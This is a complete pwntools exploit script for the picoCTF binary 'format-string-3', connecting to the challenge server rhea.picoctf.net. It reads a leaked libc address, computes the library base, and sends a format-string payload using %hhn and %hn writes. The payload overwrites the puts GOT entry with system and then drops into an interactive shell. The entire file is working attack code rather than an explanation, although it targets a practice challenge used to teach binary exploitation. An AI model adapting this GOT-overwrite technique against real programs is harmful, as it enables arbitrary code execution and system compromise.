from pwn import * 

exe = ELF("./format-string-3")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 62870)

    return r

def main():
	r = conn()
	input()
	# info("Libc puts sym: " + hex(libc.sym.puts))		#0x79bf0
	# info("Libc system sym: " + hex(libc.sym.system))	#0x4f760
	r.recvuntil(b": ")
	libc_leak = int(r.recv(14).decode(), 16)
	libc.address = libc_leak - libc.sym.setvbuf
	info("Libc leak: " + hex(libc_leak))
	info("Libc address: " + hex(libc.address))
	pause()
	r.recvline()
	dif1 = libc.sym['system'] & 0xff
	dif2 = (libc.sym['system'] >> 8) & 0xffff
	payload = f'%{dif1}c%46$hhn'.encode()
	# payload = f'%{dif1}c%p'.encode()
	
	payload += f'%{dif2 - dif1}c%47$hn'.encode()
	# payload += f'%{dif2 - dif1}c%p'.encode()
	
	payload = payload.ljust(0x40, b'A')
	payload += p64(exe.got['puts'])
	payload += p64(exe.got['puts'] + 1)
	
	r.sendline(payload)

	pause()
	r.interactive()
if __name__ == "__main__":
	main()